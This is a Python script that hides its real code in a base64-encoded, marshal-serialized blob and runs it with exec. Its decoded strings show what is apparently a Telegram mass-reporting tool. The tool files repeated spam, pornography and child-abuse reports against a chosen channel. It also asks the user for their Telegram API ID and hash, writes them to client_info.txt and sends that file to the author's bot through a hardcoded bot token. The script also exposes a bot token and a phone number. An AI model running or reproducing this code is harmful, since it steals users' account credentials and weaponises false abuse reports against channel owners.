import base64
import marshal


base64_code = '''
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

'''


decoded_bytes = base64.b64decode(base64_code)


exec(marshal.loads(decoded_bytes))